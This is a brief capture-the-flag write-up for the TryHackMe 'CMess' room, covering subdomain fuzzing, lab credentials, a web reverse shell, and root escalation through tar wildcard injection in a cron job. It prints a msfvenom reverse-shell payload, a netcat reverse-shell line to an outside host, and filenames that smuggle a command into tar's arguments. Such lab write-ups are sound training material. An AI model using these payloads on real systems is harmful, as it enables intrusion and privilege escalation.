<https://tryhackme.com/room/cmess> Can you root this Gila CMS box?

# Notes

Nmap scan only shows 2 results ssh and port 80. Checking the site we find a gila cms but spending an hour poking around doesn't lead to anything. Gobuster results dont find anything.

# wfuzz

- `wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-
top1million-20000.txt --hc 400,404,403 -H "Host: FUZZ.cmess.thm" -u 
http://cmess.thm -t 100 -hw 290`

getting waaaay to many responses so we can use --hw

we find dev.cmess.thm lets add it to the /etc/hosts and enumerate

- `andre@cmess.thm:KPFTN_f2yxe%`

now that we have creds we can login and upload revshell to /tmp and edit the htaccess to allow and after setting up a listener we have a www-data shell

# privesc

crontab

*/2 *   * * *   root    cd /home/mandre/backup && tar -zcf /tmp/andre_backup.tar.gz *

so anything we put into the /home/mandre/backup dir will be backed up to tmp every 2 mins.

checking linpeas can find `-rwxrwxrwx 1 root root 36 Feb  6  2020 /opt/.password.bak`

su to anre or ssh in `andre:UQfsdCB7aAP6`

# wildcard esc

1. create payload `msfvenom -p cmd/unix/reverse_netcat lhost 10.2.3.64 lport=6679 R`
2. copy and paste the payload 
3. `echo "mkfifo /tmp/lhennp; nc 192.168.1.102 8888 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh`
4. `echo "" > "--checkpoint-action=exec=sh shell.sh"`
5. `echo "" > --checkpoint=1`

have listener setup and wait for response and collect root flag!
